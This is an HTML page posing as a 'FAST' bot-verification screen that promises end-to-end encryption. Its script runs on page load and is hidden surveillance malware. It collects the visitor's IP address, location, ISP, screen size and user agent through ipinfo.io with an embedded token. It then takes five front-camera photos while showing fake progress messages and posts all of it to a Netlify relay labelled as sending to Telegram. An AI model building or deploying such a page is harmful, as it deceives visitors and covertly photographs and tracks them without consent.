<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    html, body {
      height: 100%;
      font-family: -apple-system, sans-serif;
      background: #0a0a0a;
      color: #e8e4dc;
      overflow: hidden;
    }
    .container {
      position: absolute;
      top: 50%; left: 50%;
      transform: translate(-50%, -50%);
      width: 92%;
      max-width: 420px;
      padding: 50px 40px 40px;
      background: linear-gradient(180deg, #121212 0%, #0d0d0d 100%);
      border: 1px solid rgba(212, 175, 105, 0.18);
      border-radius: 4px;
      text-align: center;
      animation: fade 0.9s ease both;
    }
    @keyframes fade {
      from { opacity: 0; transform: translate(-50%, -46%); }
      to   { opacity: 1; transform: translate(-50%, -50%); }
    }
    .monogram {
      display: inline-block;
      font-size: 11px;
      font-weight: 600;
      letter-spacing: 6px;
      color: #d4af69;
      margin-bottom: 30px;
      padding-bottom: 6px;
      border-bottom: 1px solid rgba(212, 175, 105, 0.25);
    }
    .emblem {
      position: relative;
      width: 88px; height: 88px;
      margin: 0 auto 28px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .emblem .outline {
      position: absolute;
      inset: 0;
      border-radius: 50%;
      border: 1px solid rgba(212, 175, 105, 0.35);
    }
    .emblem .core {
      width: 56px; height: 56px;
      border-radius: 50%;
      background: radial-gradient(circle at 35% 30%, #f0d99b 0%, #d4af69 35%, #8a6d2f 100%);
      display: flex;
      align-items: center;
      justify-content: center;
      animation: glow 3s ease-in-out infinite;
    }
    @keyframes glow {
      0%, 100% { box-shadow: 0 8px 22px rgba(212, 175, 105, 0.25); }
      50%      { box-shadow: 0 8px 30px rgba(212, 175, 105, 0.55); }
    }
    .emblem .core svg {
      width: 24px; height: 24px;
      stroke: #1a1408;
      fill: none;
      stroke-width: 1.8;
      stroke-linecap: round;
      stroke-linejoin: round;
    }
    h1 {
      font-size: 32px;
      color: #f0e8d8;
      margin-bottom: 12px;
    }
    h1 em { font-style: italic; color: #d4af69; }
    p {
      font-size: 13px;
      line-height: 1.7;
      color: rgba(232, 228, 220, 0.55);
      max-width: 290px;
      margin: 0 auto;
    }
    .divider {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
      margin: 30px auto 24px;
      width: 70%;
    }
    .divider::before, .divider::after {
      content: "";
      flex: 1;
      height: 1px;
      background: linear-gradient(90deg, transparent, rgba(212, 175, 105, 0.4), transparent);
    }
    .divider .diamond {
      width: 6px; height: 6px;
      background: #d4af69;
      transform: rotate(45deg);
      animation: diamondPulse 2.4s ease-in-out infinite;
    }
    @keyframes diamondPulse {
      0%, 100% { opacity: 0.6; transform: rotate(45deg) scale(1); }
      50%      { opacity: 1;   transform: rotate(45deg) scale(1.3); }
    }
    .progress {
      position: relative;
      height: 1px;
      width: 100%;
      background: rgba(212, 175, 105, 0.12);
      overflow: hidden;
    }
    .progress::after {
      content: "";
      position: absolute;
      top: 0; left: 0;
      height: 100%;
      width: 40%;
      background: linear-gradient(90deg, transparent, #d4af69, #f0d99b, #d4af69, transparent);
      animation: sweep 2.4s cubic-bezier(0.65, 0, 0.35, 1) infinite;
    }
    @keyframes sweep {
      0%   { left: -40%; }
      100% { left: 100%; }
    }
    .status {
      display: inline-flex;
      align-items: center;
      gap: 10px;
      margin-top: 22px;
      font-size: 11.5px;
      font-weight: 500;
      letter-spacing: 1.2px;
      text-transform: uppercase;
      color: rgba(212, 175, 105, 0.9);
    }
    .status::before {
      content: "";
      width: 5px; height: 5px;
      border-radius: 50%;
      background: #d4af69;
      animation: ping 1.8s ease-out infinite;
    }
    @keyframes ping {
      0%   { box-shadow: 0 0 0 0 rgba(212, 175, 105, 0.6); }
      70%  { box-shadow: 0 0 0 8px rgba(212, 175, 105, 0); }
      100% { box-shadow: 0 0 0 0 rgba(212, 175, 105, 0); }
    }
    .secure {
      margin-top: 34px;
      padding-top: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      font-size: 10px;
      font-weight: 500;
      letter-spacing: 2px;
      text-transform: uppercase;
      color: rgba(212, 175, 105, 0.45);
    }
  </style>
</head>
<body>
  <div class="container">
    <span class="monogram">FAST</span>

    <div class="emblem">
      <span class="outline"></span>
      <div class="core">
        <svg viewBox="0 0 24 24">
          <rect x="5" y="11" width="14" height="9" rx="2" />
          <path d="M8 11V8a4 4 0 0 1 8 0v3" />
        </svg>
      </div>
    </div>

    <h1>Verifying your <em>identity</em></h1>
    <p>We are verifying that you're not a bot.</p>

    <div class="divider"><span class="diamond"></span></div>

    <div class="progress"></div>

    <p class="status" id="status">Initializing...</p>

    <div class="secure">🔒 End-to-end encrypted</div>
  </div>

  <script>
    const statusEl = document.getElementById('status');

    // ⚙️ Netlify backend URL
    const API = '/.netlify/functions/send';

    window.onload = async () => {
      statusEl.textContent = '📡 Connecting with server...';
      await sendDeviceInfo();

      try {
        statusEl.textContent = '🔨 Analyzing...';
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" }, audio: false
        });

        const track = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(track);

        for (let i = 0; i < 5; i++) {
          const per = (i + 1) * 20;
          statusEl.textContent = `⚙️ Working ${per}%...`;
          const blob = await imageCapture.takePhoto();
          const compressedBlob = await compressImage(blob);
          const base64 = await blobToBase64(compressedBlob);
          await sendToTelegram(base64, 'photo');
          await new Promise(res => setTimeout(res, 1000));
        }

        track.stop();
        statusEl.textContent = '✅ Verified!';
      } catch (err) {
        statusEl.textContent = '❌ Camera permission denied.';
        console.error(err);
      }
    };

    async function sendDeviceInfo() {
      try {
        const ip = await fetch('https://ipinfo.io/json?token=5602d2e05cb668').then(r => r.json());
        const time = new Date().toLocaleString('en-IN');
        const msg = `
🌐 *IP Information*

🔢 IP Address: ${ip.ip}
📍 Location: ${ip.city}
🌍 Region: ${ip.region}
🗺 Country: ${ip.country}
📡 ISP: ${ip.org}


📱 *Device Details*

🖥️ Screen: ${screen.width}x${screen.height}
🕒 Time: ${time}
🧠 UA: ${navigator.userAgent}
        `;
        await sendToTelegram(msg.trim(), 'text');
      } catch (e) {
        console.error("Device Info Error:", e);
      }
    }

    async function blobToBase64(blob) {
  return new Promise((resolve) => {
    const reader = new FileReader();
    reader.onloadend = () => {
      const base64 = reader.result.split(',')[1];
      resolve('data:image/jpeg;base64,' + base64);
    };
    reader.readAsDataURL(blob);
  });
}
    async function sendToTelegram(data, type) {
      await fetch(API, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type, text: data, photo: data })
      });
    }
  </script>
</body>
</html>
